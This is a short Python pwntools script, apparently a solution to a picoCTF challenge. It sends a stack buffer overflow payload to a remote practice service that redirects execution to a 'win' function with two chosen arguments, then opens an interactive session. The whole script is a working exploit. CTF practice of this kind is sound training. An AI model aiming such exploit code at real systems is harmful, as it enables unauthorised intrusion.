from pwn import *

conn = remote("saturn.picoctf.net", 53124)
elf = ELF("vuln")

payload = b""
payload += b"a" * 112
payload += p32(elf.symbols["win"])
payload += b"a" * 4
payload += p32(0xCAFEF00D)
payload += p32(0xF00DF00D)

conn.sendline(payload)
conn.interactive()
